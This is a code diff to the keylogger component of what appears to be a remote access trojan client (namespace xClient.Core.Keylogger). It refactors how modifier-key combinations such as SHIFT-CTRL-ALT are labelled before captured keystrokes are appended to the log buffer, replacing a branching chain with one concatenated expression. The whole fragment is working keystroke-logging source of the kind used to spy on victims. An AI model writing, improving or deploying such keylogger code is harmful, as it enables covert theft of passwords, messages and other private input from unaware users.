@@ -213,26 +213,13 @@ namespace xClient.Core.Keylogger
                         default:
                             if (_enumValues.Contains(k.Value))
                             {
-                                if (k.AltKey && k.ControlKey && k.ShiftKey)
-                                {
-                                    _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                }
-                                else if (k.AltKey && k.ControlKey && !k.ShiftKey)
-                                {
-                                    _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                }
-                                else if (k.AltKey && !k.ControlKey)
-                                {
-                                    _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                }
-                                else if (k.ControlKey && !k.AltKey)
-                                {
-                                    _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                }
-                                else
-                                {
-                                    _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
-                                }
+                                _logFileBuffer.Append(
+                                    HighlightSpecialKey(
+                                        ((k.ShiftKey)   ? "SHIFT-" : string.Empty) +
+                                        ((k.ControlKey) ? "CTRL-"  : string.Empty) +
+                                        ((k.AltKey)     ? "ALT-"   : string.Empty) +
+                                        FromKeys(k.Value, k.ShiftKey, k.CapsLock)
+                                        ));
                             }
                             break;
                     }
